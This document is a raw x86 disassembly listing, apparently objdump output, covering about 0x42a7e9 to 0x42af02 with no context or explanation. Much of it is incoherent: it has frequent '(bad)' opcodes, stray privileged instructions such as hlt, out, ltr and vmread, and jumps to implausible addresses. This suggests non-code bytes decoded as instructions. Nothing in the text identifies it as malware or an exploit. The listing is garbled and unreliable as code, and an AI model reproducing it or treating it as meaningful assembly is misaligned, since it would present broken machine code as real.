  42a7e9:	dec    DWORD PTR [esi]
  42a7eb:	mov    ecx,ecx
  42a7ed:	loopne 0x42a774
  42a7ef:	mov    DWORD PTR [edx],0x4d8b00c3
  42a7f5:	sbb    al,0x8b
  42a7f7:	out    dx,al
  42a7f8:	mov    eax,DWORD PTR [eax]
  42a7fa:	push   eax
  42a7fb:	push   eax
  42a7fc:	test   DWORD PTR [ebp-0x1],eax
  42a7ff:	mov    edi,edi
  42a801:	cwde   
  42a802:	inc    ebp
  42a803:	add    BYTE PTR [ebx],dh
  42a805:	mov    DWORD PTR [ebx],0x24ff8918
  42a80b:	add    al,0xff
  42a80d:	add    BYTE PTR [ebx-0x5ae30f77],cl
  42a813:	(bad)  
  42a814:	(bad)  
  42a815:	(bad)  
  42a816:	(bad)  
  42a817:	push   DWORD PTR [ebx]
  42a819:	or     BYTE PTR [ebx],al
  42a81b:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  42a822:	(bad)  
  42a823:	cld    
  42a824:	sbb    BYTE PTR [ebx+0x765050ff],al
  42a82a:	inc    ebp
  42a82b:	mov    esi,DWORD PTR [ebx]
  42a82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a82e:	add    ecx,esi
  42a830:	push   eax
  42a831:	mov    BYTE PTR [ebp+0x4d],0x5
  42a835:	jmp    0x42a837
  42a837:	mov    eax,DWORD PTR [eax]
  42a839:	clc    
  42a83a:	mov    ecx,DWORD PTR [esp+ebx*1]
  42a83d:	inc    DWORD PTR [eax+0x5501fc]
  42a843:	mov    BYTE PTR [ebp-0xe70075],al
  42a849:	cmp    eax,DWORD PTR [eax]
  42a84b:	push   eax
  42a84c:	add    cl,ch
  42a84e:	xor    BYTE PTR [esi+0x4d],cl
  42a851:	add    edi,edi
  42a853:	mov    ecx,DWORD PTR [eax]
  42a855:	mov    al,ds:0x8b8b004d
  42a85a:	mov    ebp,DWORD PTR [ebx]
  42a85c:	hlt    
  42a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a85e:	add    dh,al
  42a860:	add    DWORD PTR [ebp+0x45],edx
  42a863:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  42a869:	dec    ebp
  42a86a:	inc    eax
  42a86b:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  42a871:	add    BYTE PTR [ebx-0x38162400],cl
  42a877:	add    bl,al
  42a879:	add    BYTE PTR [ebp-0x2e003e],al
  42a87f:	mov    DWORD PTR [ebp-0x10],eax
  42a882:	mov    DWORD PTR [ebp+0x28],esp
  42a885:	push   eax
  42a886:	dec    DWORD PTR [ecx+0x5518e88d]
  42a88c:	dec    DWORD PTR [ecx+0x5545f050]
  42a892:	xor    ecx,DWORD PTR [edi]
  42a894:	add    edx,DWORD PTR [edx]
  42a896:	push   eax
  42a897:	xchg   ebp,eax
  42a898:	inc    ebp
  42a899:	inc    DWORD PTR ds:0xe200ff
  42a89f:	jnp    0x8097c4a5
  42a8a5:	mov    eax,DWORD PTR [ecx]
  42a8a7:	pusha  
  42a8a8:	add    bh,bh
  42a8aa:	test   ecx,eax
  42a8ac:	dec    DWORD PTR [edi+edi*8]
  42a8af:	ret    0x8d00
  42a8b2:	add    bh,bh
  42a8b4:	mov    ch,0xd7
  42a8b6:	(bad)  
  42a8b7:	cli    
  42a8b8:	inc    DWORD PTR [ebp+0x2255f830]
  42a8be:	test   DWORD PTR [ebp+0x74],ecx
  42a8c1:	add    ecx,DWORD PTR [ebx+0x65a01889]
  42a8c7:	or     BYTE PTR [eax],al
  42a8c9:	cmp    DWORD PTR [eax+0x74],edi
  42a8cc:	add    BYTE PTR [ebx+0x114dfc23],cl
  42a8d2:	sub    eax,DWORD PTR [eax]
  42a8d4:	mov    ecx,DWORD PTR [ebp-0x77]
  42a8d7:	mov    eax,edi
  42a8d9:	add    DWORD PTR [ebx],eax
  42a8db:	inc    ebp
  42a8dc:	dec    ebp
  42a8dd:	mov    ecx,DWORD PTR [edx+0x45450118]
  42a8e3:	add    cl,BYTE PTR [ebx+0x875fc4d]
  42a8e9:	mov    ecx,DWORD PTR [ebp-0xc]
  42a8ec:	inc    eax
  42a8ed:	push   ebp
  42a8ee:	push   ecx
  42a8ef:	mov    esi,DWORD PTR [edx-0x14]
  42a8f2:	mov    edx,DWORD PTR [ecx+0xce003c]
  42a8f8:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  42a8ff:	add    al,0x55
  42a901:	push   ebp
  42a902:	add    ecx,DWORD PTR [ecx-0x2d030777]
  42a908:	push   ecx
  42a909:	test   DWORD PTR [ebx],eax
  42a90b:	dec    DWORD PTR [ecx+0x554518ff]
  42a911:	mov    edi,eax
  42a913:	sbb    al,0xec
  42a915:	inc    DWORD PTR [eax]
  42a917:	mov    DWORD PTR [eax],0xff8318
  42a91d:	add    al,0x83
  42a91f:	add    al,bh
  42a921:	mov    ebp,edx
  42a923:	push   eax
  42a924:	push   ebp
  42a925:	test   DWORD PTR [edi+edi*8-0x73],esi
  42a929:	dec    DWORD PTR [eax]
  42a92b:	inc    ebp
  42a92c:	push   ebp
  42a92d:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  42a933:	and    al,0x8b
  42a935:	(bad)  
  42a936:	call   0x89df60c8
  42a93b:	test   DWORD PTR [eax-0x1],esp
  42a93e:	(bad)  
  42a93f:	inc    DWORD PTR [ecx+0xffff85]
  42a945:	dec    DWORD PTR [ecx-0x6a1f5f75]
  42a94b:	(bad)  
  42a94c:	inc    ebx
  42a94e:	dec    DWORD PTR [ebx-0x117ee316]
  42a954:	bound  eax,QWORD PTR [eax]
  42a956:	int    0x50
  42a958:	xor    eax,DWORD PTR [ebp-0x7f]
  42a95b:	mov    esi,DWORD PTR [edx]
  42a95d:	cwde   
  42a95e:	pushf  
  42a95f:	add    BYTE PTR [ebp-0x1],dh
  42a962:	mov    edi,edi
  42a964:	mov    al,ds:0x4d45ce08
  42a969:	inc    DWORD PTR [ebx]
  42a96b:	adc    al,0x83
  42a96d:	add    BYTE PTR [eax],0x1
  42a970:	adc    BYTE PTR [eax],al
  42a972:	push   ebp
  42a973:	inc    ebp
  42a974:	add    edi,edi
  42a976:	mov    edx,DWORD PTR [eax]
  42a978:	mov    ecx,DWORD PTR [ebp-0x60]
  42a97b:	push   esi
  42a97c:	adc    al,0x8
  42a97e:	mov    edx,DWORD PTR [ebp-0x8]
  42a981:	mov    ecx,DWORD PTR [ebp-0x4]
  42a984:	add    DWORD PTR [ebp-0x18],0xffffff8d
  42a988:	inc    DWORD PTR [eax+esi*8]
  42a98b:	inc    ebp
  42a98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a98d:	mov    edx,DWORD PTR [ebp+0x1c]
  42a990:	add    DWORD PTR [ebp-0x14],eax
  42a993:	mov    edx,DWORD PTR [ebp-0x70]
  42a996:	cmp    eax,DWORD PTR [eax]
  42a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a999:	mov    eax,DWORD PTR [eax]
  42a99b:	sbb    al,0x73
  42a99d:	add    BYTE PTR [ebx],0x1
  42a9a0:	hlt    
  42a9a1:	add    BYTE PTR [eax+0x30],dl
  42a9a4:	mov    DWORD PTR [ecx],esi
  42a9a6:	hlt    
  42a9a7:	pop    ds
  42a9a8:	inc    ebp
  42a9a9:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  42a9af:	(bad)  
  42a9b0:	push   DWORD PTR [edi]
  42a9b2:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  42a9b8:	push   DWORD PTR [ebx-0x1]
  42a9bb:	mov    eax,DWORD PTR [ebp-0x740075]
  42a9c1:	sub    eax,DWORD PTR [eax]
  42a9c3:	add    eax,DWORD PTR [eax]
  42a9c5:	mov    DWORD PTR [ecx+0x5f],eax
  42a9c8:	mov    DWORD PTR [ebx+0x20],ebx
  42a9cb:	ret    0xff
  42a9ce:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  42a9d4:	ret    
  42a9d5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  42a9db:	add    BYTE PTR [ebp-0x7d],al
  42a9de:	mov    DWORD PTR [eax],eax
  42a9e0:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  42a9e7:	sar    bh,cl
  42a9e9:	test   BYTE PTR [eax+0x1],dl
  42a9ec:	inc    ebp
  42a9ed:	add    BYTE PTR [ebx],dh
  42a9ef:	test   BYTE PTR [ebx],0x84
  42a9f2:	push   eax
  42a9f3:	add    BYTE PTR [ebp+0x0],al
  42a9f6:	add    eax,0x86
  42a9fb:	add    BYTE PTR [ebx-0x7f7be340],cl
  42aa01:	add    BYTE PTR [ecx],al
  42aa03:	add    BYTE PTR [eax],al
  42aa05:	mov    esi,0x550030
  42aa0a:	mov    ecx,DWORD PTR [edi]
  42aa0c:	sbb    al,0xda
  42aa0e:	jne    0x42aa10
  42aa10:	mov    edi,DWORD PTR [ecx]
  42aa12:	xor    BYTE PTR [eax+eax*1],0x84
  42aa16:	add    eax,DWORD PTR [eax]
  42aa18:	cld    
  42aa19:	add    BYTE PTR [ebp-0x4f],dh
  42aa1c:	mov    eax,DWORD PTR [ecx]
  42aa1e:	cld    
  42aa1f:	add    BYTE PTR [ecx-0x1bff009b],cl
  42aa25:	retf   0xe45
  42aa28:	add    eax,edx
  42aa2a:	sbb    al,0xb7
  42aa2c:	dec    ebp
  42aa2d:	or     al,0x89
  42aa2f:	dec    ebp
  42aa30:	sbb    al,0xf
  42aa32:	inc    ebp
  42aa33:	dec    eax
  42aa34:	mov    eax,DWORD PTR [ebx]
  42aa36:	sbb    al,0xf
  42aa38:	nop
  42aa39:	scas   al,BYTE PTR es:[edi]
  42aa3a:	add    DWORD PTR [eax],eax
  42aa3c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  42aa42:	mov    eax,gs
  42aa44:	add    bh,bh
  42aa46:	mov    edi,edi
  42aa48:	cmp    DWORD PTR [edi+0x72],edx
  42aa4b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  42aa51:	gs cmp al,0x0
  42aa54:	je     0x42aa2c
  42aa56:	push   eax
  42aa57:	sar    BYTE PTR [eax],1
  42aa59:	mov    bh,0x3e
  42aa5b:	push   cs
  42aa5c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  42aa62:	add    DWORD PTR [ecx+0x12],ebp
  42aa65:	dec    edx
  42aa66:	(bad)  
  42aa67:	mov    eax,edx
  42aa69:	in     al,dx
  42aa6a:	adc    DWORD PTR [ecx],esi
  42aa6c:	pop    esi
  42aa6d:	inc    ecx
  42aa6e:	leave  
  42aa6f:	or     DWORD PTR [eax],ebx
  42aa71:	gs push ebp
  42aa73:	add    ah,ch
  42aa75:	into   
  42aa76:	in     al,dx
  42aa77:	enter  0xb756,0xf0
  42aa7b:	push   cs
  42aa7c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  42aa86:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  42aa8c:	jnp    0x74432f94
  42aa92:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  42aa98:	add    BYTE PTR [edi],cl
  42aa9a:	mov    edi,DWORD PTR [ecx-0x78]
  42aa9d:	ltr    WORD PTR [ecx-0x7b]
  42aaa1:	dec    DWORD PTR [edi]
  42aaa3:	clc    
  42aaa4:	out    0x45,eax
  42aaa6:	add    BYTE PTR [eax],cl
  42aaa8:	cmp    ebx,0xffffff8c
  42aaab:	jge    0x42aaad
  42aaad:	jb     0x42aabf
  42aaaf:	je     0x51ab2f
  42aab5:	pop    edx
  42aab6:	push   esi
  42aab7:	mov    ecx,DWORD PTR [edi]
  42aab9:	in     al,dx
  42aaba:	rol    DWORD PTR [ebp+0x0],1
  42aabd:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42aac4:	cmp    DWORD PTR [ecx],0xfffffff0
  42aac7:	hlt    
  42aac8:	mov    esp,DWORD PTR [eax+0xf034d2b]
  42aace:	(bad)  
  42aad0:	push   eax
  42aad1:	jns    0xb8428f4f
  42aad7:	lock push cs
  42aad9:	ror    edx,0x3
  42aadc:	test   BYTE PTR [ecx+0x5500e800],cl
  42aae2:	dec    eax
  42aae3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42aae7:	(bad)  
  42aae8:	mov    esi,0x7f33ff5f
  42aaed:	inc    eax
  42aaee:	test   DWORD PTR [edx],eax
  42aaf0:	je     0x42aab2
  42aaf2:	mov    ecx,ecx
  42aaf4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42aaf8:	and    eax,DWORD PTR [eax+0xf0103]
  42aafe:	jp     0x42aaec
  42ab00:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42ab04:	add    edx,DWORD PTR [edi+0x74]
  42ab07:	sbb    BYTE PTR [ebp+0x4d001484],cl
  42ab0d:	add    BYTE PTR [ebp-0x74c48bbb],al
  42ab13:	je     0x42aa98
  42ab15:	cmp    eax,edi
  42ab17:	js     0x42ab3c
  42ab19:	add    eax,0xeb0fc003
  42ab1e:	jns    0x42aaab
  42ab20:	vmread DWORD PTR [ecx+0x45],ebx
  42ab24:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  42ab2a:	adc    al,0x8b
  42ab2c:	jge    0x42ab42
  42ab2e:	mov    edi,DWORD PTR [eax-0x4]
  42ab31:	add    edi,DWORD PTR [edi]
  42ab33:	or     bh,bh
  42ab35:	push   ebp
  42ab36:	push   es
  42ab37:	mov    DWORD PTR [ebp-0x4],ebx
  42ab3a:	add    edi,esi
  42ab3c:	pop    es
  42ab3d:	add    esi,DWORD PTR [edi-0x48ccf183]
  42ab43:	mov    DWORD PTR [esp+esi*8],ecx
  42ab46:	inc    ebp
  42ab47:	pop    ebp
  42ab48:	xor    DWORD PTR [esi-0x4],0x3b
  42ab4c:	add    edx,DWORD PTR [ecx+edi*1]
  42ab4f:	push   es
  42ab50:	clc    
  42ab51:	mov    bh,0xdb
  42ab53:	jp     0x42ab0c
  42ab55:	add    cl,BYTE PTR [esi]
  42ab57:	div    DWORD PTR [edi+0x4d8b0c1c]
  42ab5d:	test   edi,edi
  42ab5f:	je     0x42ab55
  42ab61:	mov    eax,ecx
  42ab63:	or     BYTE PTR [ebx],al
  42ab65:	dec    BYTE PTR [ecx+0x7d3bec7d]
  42ab6b:	jbe    0x42abdf
  42ab6d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42ab73:	add    ecx,DWORD PTR [esi]
  42ab75:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  42ab7b:	add    eax,DWORD PTR [ebx-0x287af783]
  42ab81:	je     0x42abd0
  42ab83:	mov    DWORD PTR [ecx],edi
  42ab85:	mov    esi,eax
  42ab87:	hlt    
  42ab88:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  42ab8f:	jb     0x42ab51
  42ab91:	jmp    0x42ab7e
  42ab93:	xor    esi,DWORD PTR [ebx]
  42ab95:	pop    edi
  42ab96:	pop    esi
  42ab97:	pop    ebx
  42ab98:	ret    
  42ab99:	ret    0x8b
  42ab9c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  42aba2:	xor    DWORD PTR ds:0x89339c0c,0x56
  42aba9:	cld    
  42abaa:	cmp    DWORD PTR [ebp+0xf],eax
  42abad:	xor    al,0x85
  42abaf:	pushf  
  42abb0:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  42abb6:	ret    
  42abb7:	mov    edi,DWORD PTR [esi-0x4]
  42abba:	pop    eax
  42abbb:	dec    ebp
  42abbc:	jne    0x42ab49
  42abbe:	xor    edi,esp
  42abc0:	inc    eax
  42abc1:	dec    ebp
  42abc2:	jbe    0x42ac17
  42abc4:	inc    eax
  42abc5:	pop    ebp
  42abc6:	add    edx,DWORD PTR [esi+0x8]
  42abc9:	push   edi
  42abca:	dec    eax
  42abcb:	push   ecx
  42abcc:	mov    eax,edi
  42abce:	and    al,0xf0
  42abd0:	jo     0x42abbd
  42abd2:	mov    eax,DWORD PTR [ebx]
  42abd4:	sbb    BYTE PTR [ebp+0x4d],cl
  42abd7:	mov    eax,DWORD PTR [ebx]
  42abd9:	nop
  42abda:	or     BYTE PTR [eax],al
  42abdc:	jne    0x42ac35
  42abde:	cmp    ebx,DWORD PTR [esi+0x33893277]
  42abe4:	cld    
  42abe5:	xor    edi,edi
  42abe7:	add    edi,DWORD PTR [ebp+0x3]
  42abea:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  42abf0:	js     0x42ab76
  42abf2:	jae    0x42abf6
  42abf4:	(bad)  
  42abf6:	xor    al,0x5d
  42abf8:	jmp    0x42ab85
  42abfa:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  42ac01:	fdecstp 
  42ac03:	test   BYTE PTR [edi],ah
  42ac05:	add    bh,BYTE PTR [ebp+0x0]
  42ac08:	add    ebx,DWORD PTR [ebp-0x77]
  42ac0b:	mov    edi,eax
  42ac0d:	cmp    al,0x0
  42ac10:	adc    dh,BYTE PTR [ebx]
  42ac12:	jge    0x42ac17
  42ac14:	mov    edi,DWORD PTR [ebx]
  42ac16:	jl     0x42ac27
  42ac18:	clc    
  42ac19:	dec    edi
  42ac1a:	jge    0x42ac1c
  42ac1c:	mov    eax,DWORD PTR [ebx]
  42ac1e:	jb     0x42ac28
  42ac20:	mov    ecx,DWORD PTR [ebp-0x8]
  42ac23:	mov    edi,edi
  42ac25:	xor    edx,DWORD PTR [eax]
  42ac27:	add    edi,DWORD PTR [ebx]
  42ac29:	mov    DWORD PTR [ebp-0x10],edi
  42ac2c:	inc    edi
  42ac2d:	pop    ebp
  42ac2e:	jge    0x42ac6b
  42ac30:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42ac34:	mov    edx,0xc05d87f0
  42ac39:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  42ac3d:	fimul  WORD PTR [eax]
  42ac3f:	fist   WORD PTR [ebp+0x1c]
  42ac42:	in     al,dx
  42ac43:	jne    0x42ac31
  42ac45:	mov    edi,DWORD PTR [edx-0x7a27a10]
  42ac4b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  42ac4f:	fdivp  st(0),st
  42ac51:	fild   WORD PTR [ebp+0x4510f85c]
  42ac57:	test   BYTE PTR [ebx+0x4d00fc02],cl
  42ac5d:	inc    ebp
  42ac5e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42ac64:	mov    ebp,DWORD PTR [ebx-0x4]
  42ac67:	adc    al,0x8b
  42ac69:	rcl    DWORD PTR [eax],0x48
  42ac6c:	mov    esi,0x7080803
  42ac71:	fiadd  WORD PTR [ebp+0x4d]
  42ac74:	(bad)  
  42ac75:	mov    edx,DWORD PTR [edx-0x4]
  42ac78:	mov    edx,DWORD PTR [ebp-0x4]
  42ac7b:	xor    ebx,DWORD PTR [ebx+0x330103]
  42ac81:	mov    DWORD PTR [edi+0x872dc],edi
  42ac87:	xlat   BYTE PTR ds:[ebx]
  42ac88:	into   
  42ac89:	ffreep st(6)
  42ac8b:	retf   0x6c7
  42ac8e:	iret   
  42ac8f:	dec    ebp
  42ac90:	inc    ebp
  42ac91:	mov    DWORD PTR [ebx],edi
  42ac93:	fmul   QWORD PTR [edi]
  42ac95:	dec    ebp
  42ac96:	jnp    0x42accb
  42ac98:	add    BYTE PTR [ebx],al
  42ac9a:	mov    ecx,DWORD PTR [esp+edi*8]
  42ac9d:	inc    ebp
  42ac9e:	dec    ebp
  42ac9f:	lea    esi,[ebx]
  42aca1:	add    DWORD PTR [ebx],eax
  42aca3:	jb     0x42ace0
  42aca5:	add    BYTE PTR [edi],cl
  42aca7:	inc    ebp
  42aca8:	imul   eax,edi,0x858bd800
  42acae:	cld    
  42acaf:	clc    
  42acb0:	mov    DWORD PTR [ebp+0x0],eax
  42acb3:	inc    DWORD PTR [eax]
  42acb5:	or     al,0xde
  42acb7:	sbb    bh,0x1
  42acba:	retf   
  42acbb:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  42acc2:	dec    ebp
  42acc3:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  42acc9:	enter  0x12de,0xdf
  42accd:	inc    ebp
  42acce:	pop    ebp
  42accf:	dec    DWORD PTR [ebx-0x257f0ff4]
  42acd5:	add    DWORD PTR [edx],edx
  42acd7:	add    BYTE PTR [ebp+0x50],dl
  42acda:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  42ace0:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  42ace7:	loopne 0x42ad00
  42ace9:	cdq    
  42acea:	push   ebp
  42aceb:	clc    
  42acec:	mov    eax,DWORD PTR [ebp-0x4]
  42acef:	xor    edx,edx
  42acf1:	add    esi,DWORD PTR [ebx]
  42acf3:	cmp    eax,DWORD PTR [ebx]
  42acf5:	hlt    
  42acf6:	cmp    DWORD PTR [ebx],esp
  42acf8:	or     al,BYTE PTR [ebp+0xf]
  42acfb:	mov    eax,DWORD PTR [edx]
  42acfd:	loopne 0x42acff
  42acff:	(bad)  
  42ad00:	mov    ecx,esi
  42ad02:	cld    
  42ad03:	pushf  
  42ad04:	pop    ebp
  42ad05:	sahf   
  42ad06:	mov    esi,DWORD PTR [edx]
  42ad08:	lock mov eax,eax
  42ad0b:	adc    BYTE PTR [ebx],al
  42ad0d:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42ad14:	xor    ebp,DWORD PTR [edi+0x50e45189]
  42ad1a:	dec    ebp
  42ad1b:	mov    ecx,DWORD PTR [ebx-0x31390304]
  42ad21:	(bad)  
  42ad22:	iret   
  42ad23:	inc    ebp
  42ad24:	(bad)  
  42ad25:	jne    0x42ad74
  42ad27:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  42ad2d:	(bad)  
  42ad2e:	cmp    ebx,eax
  42ad30:	je     0x42acb8
  42ad32:	add    edi,edi
  42ad34:	or     bh,bh
  42ad36:	dec    ebp
  42ad37:	inc    ebp
  42ad38:	mov    esi,DWORD PTR [ebx]
  42ad3a:	cld    
  42ad3b:	add    ecx,esi
  42ad3d:	cmp    ecx,DWORD PTR [eax-0xc]
  42ad40:	mov    edx,DWORD PTR [edi]
  42ad42:	or     BYTE PTR [ebp-0x7c],al
  42ad45:	mov    ebx,DWORD PTR [esi-0x7639cd18]
  42ad4b:	test   BYTE PTR [esi+ebx*4],cl
  42ad4e:	inc    ebp
  42ad4f:	xor    dh,BYTE PTR [eax]
  42ad51:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  42ad58:	jne    0x42ad21
  42ad5a:	mov    ebp,esp
  42ad5c:	fcomp  DWORD PTR [ebx]
  42ad5e:	add    BYTE PTR [ecx],al
  42ad60:	inc    DWORD PTR [ebp-0x75]
  42ad63:	(bad)  
  42ad64:	cld    
  42ad65:	add    al,0xce
  42ad67:	mov    ecx,edi
  42ad69:	cld    
  42ad6a:	inc    ebp
  42ad6b:	fidivr WORD PTR [ebx]
  42ad6d:	fbstp  TBYTE PTR [ebp-0x3e]
  42ad70:	mov    eax,DWORD PTR [eax]
  42ad72:	adc    BYTE PTR [ebx-0x3974038b],cl
  42ad78:	fadd   st,st(7)
  42ad7a:	add    BYTE PTR [ebp-0x1],al
  42ad7d:	mov    ecx,DWORD PTR [esp+edi*8]
  42ad80:	inc    ebp
  42ad81:	mov    bh,0xc7
  42ad84:	loopne 0x42adcb
  42ad86:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  42ad8c:	sbb    al,0x33
  42ad8e:	pushf  
  42ad8f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  42ad95:	mov    eax,edi
  42ad97:	cwde   
  42ad98:	inc    ebp
  42ad99:	inc    ebp
  42ad9a:	jne    0x42ad27
  42ad9c:	mov    esp,esp
  42ad9e:	clc    
  42ad9f:	add    al,0x4d
  42ada1:	mov    DWORD PTR [ebx],esi
  42ada3:	or     al,0x33
  42ada5:	inc    ebp
  42ada6:	lea    ecx,[ebx-0x398d13fd]
  42adac:	add    bh,al
  42adae:	inc    ebp
  42adaf:	ror    DWORD PTR [ebx+0x45d829],0x8b
  42adb6:	add    ebp,esp
  42adb8:	shufps xmm1,xmm3,0xc7
  42adbc:	(bad)  
  42adbd:	jmp    0x7487e8e6
  42adc2:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42adc8:	hlt    
  42adc9:	mov    ecx,DWORD PTR [edi]
  42adcb:	fadd   DWORD PTR [ebp+0x0]
  42adce:	xor    ecx,DWORD PTR [edi]
  42add0:	add    ecx,ecx
  42add2:	cmp    edi,edi
  42add4:	pmuludq mm7,QWORD PTR [edx+0x50]
  42add8:	(bad)  
  42add9:	jmp    0x42ad66
  42addb:	mov    edi,esp
  42addd:	or     al,0xc6
  42addf:	inc    ebp
  42ade0:	(bad)  
  42ade1:	mov    eax,DWORD PTR [ebp+0x10]
  42ade4:	jne    0x42ad6f
  42ade6:	mov    eax,DWORD PTR [ecx]
  42ade8:	clc    
  42ade9:	add    BYTE PTR [ebp-0x40],cl
  42adec:	xor    edx,DWORD PTR [eax-0x73]
  42adef:	jne    0x42adf2
  42adf1:	push   DWORD PTR [edx+0x8]
  42adf4:	add    BYTE PTR [ebp+0x45],al
  42adf7:	mov    ebp,ecx
  42adf9:	cld    
  42adfa:	add    BYTE PTR [ebp+0x0],cl
  42adfd:	xor    eax,DWORD PTR [ebp+0x3]
  42ae00:	lea    edi,[ebx]
  42ae02:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42ae08:	sub    eax,0x5d330e4d
  42ae0d:	lea    esi,[ebx]
  42ae0f:	add    DWORD PTR [ebx],eax
  42ae11:	jb     0x42adfc
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	inc    ebp
  42ae16:	add    bl,ch
  42ae18:	inc    ebp
  42ae19:	mov    esi,DWORD PTR [ebx]
  42ae1b:	or     al,0x3
  42ae1d:	(bad)  
  42ae1e:	mov    edi,eax
  42ae20:	in     al,dx
  42ae21:	scas   eax,DWORD PTR es:[edi]
  42ae22:	inc    ebp
  42ae23:	mov    esi,DWORD PTR [ebx]
  42ae25:	in     al,0x3
  42ae27:	add    al,0x89
  42ae29:	mov    ecx,DWORD PTR [eax+edi*8]
  42ae2c:	dec    ebp
  42ae2d:	(bad)  
  42ae2e:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3162]
  42ae35:	mov    ecx,eax
  42ae37:	cld    
  42ae38:	push   es
  42ae39:	dec    ebp
  42ae3a:	add    al,0x33
  42ae3c:	mov    DWORD PTR [ebx],eax
  42ae3e:	in     al,dx
  42ae3f:	cmp    DWORD PTR [ebp-0x67],eax
  42ae42:	mov    eax,DWORD PTR [ebp-0xba0068]
  42ae48:	mov    edx,DWORD PTR [ebp-0x4]
  42ae4b:	mov    ecx,DWORD PTR [ebp-0x18]
  42ae4e:	xor    ecx,DWORD PTR [ebp+0x3]
  42ae51:	cmp    DWORD PTR [ebx],0x8b32749d
  42ae57:	xor    edi,esp
  42ae59:	jmp    0xff76abab
  42ae5e:	add    ecx,DWORD PTR [ebp-0x3f]
  42ae61:	xor    ebx,DWORD PTR [edi]
  42ae63:	add    eax,ecx
  42ae65:	cmp    ebx,DWORD PTR [eax]
  42ae67:	mov    ecx,DWORD PTR [ebp-0x4]
  42ae6a:	mov    ecx,DWORD PTR [eax]
  42ae6c:	adc    BYTE PTR [ebp-0x80],al
  42ae6f:	jmp    0x42ae72
  42ae71:	mov    eax,DWORD PTR [eax]
  42ae73:	cld    
  42ae74:	mov    bh,0xc6
  42ae76:	push   ecx
  42ae77:	(bad)  
  42ae78:	jne    0x42aed8
  42ae7a:	dec    ecx
  42ae7c:	or     BYTE PTR [ecx+ebx*1],cl
  42ae7f:	push   ebp
  42ae80:	inc    ebp
  42ae81:	in     al,dx
  42ae82:	add    ebp,esp
  42ae84:	or     bh,al
  42ae86:	dec    ebp
  42ae87:	cld    
  42ae88:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  42ae8e:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  42ae92:	dec    DWORD PTR [ebx+0x45510cf4]
  42ae98:	mov    DWORD PTR [ebx+0x5745fc0c],ecx
  42ae9e:	mov    edx,DWORD PTR [ecx+0xc]
  42aea1:	xor    eax,esi
  42aea3:	mov    edx,0xc172c7
  42aea8:	inc    ebp
  42aea9:	mov    esi,DWORD PTR [ebp+0x8]
  42aeac:	mov    eax,edx
  42aeae:	call   0x84c775a3
  42aeb3:	add    DWORD PTR [esi-0x76bace00],ebx
  42aeb9:	mov    ebp,eax
  42aebb:	or     BYTE PTR [eax],dl
  42aebd:	jo     0x42af0c
  42aebf:	push   edi
  42aec0:	xor    esi,DWORD PTR [ebp+0x3]
  42aec3:	(bad)  
  42aec4:	pmulhuw mm0,mm1
  42aec7:	test   DWORD PTR [ebp-0x8],ecx
  42aeca:	mov    DWORD PTR [ebp-0x67],eax
  42aecd:	mov    eax,DWORD PTR [ebp-0x4]
  42aed0:	xor    edi,DWORD PTR [ebp-0x73]
  42aed3:	xor    eax,DWORD PTR [ebx]
  42aed5:	xor    esi,DWORD PTR [edx+0x3]
  42aed8:	add    BYTE PTR [ecx],bh
  42aeda:	inc    ebp
  42aedb:	(bad)  
  42aedc:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  42aee2:	mov    DWORD PTR [eax],0x750f0004
  42aee8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  42aeee:	lock add BYTE PTR [ebp+0x0],al
  42aef2:	mov    esi,DWORD PTR [ebp-0x2c]
  42aef5:	mov    ebp,edx
  42aef7:	or     al,0x72
  42aef9:	ja     0x42aefb
  42aefb:	mov    edx,esi
  42aefd:	cld    
  42aefe:	(bad)  
  42af01:	cli    
  42af02:	mov    esi,DWORD PTR [ebp-0x4]
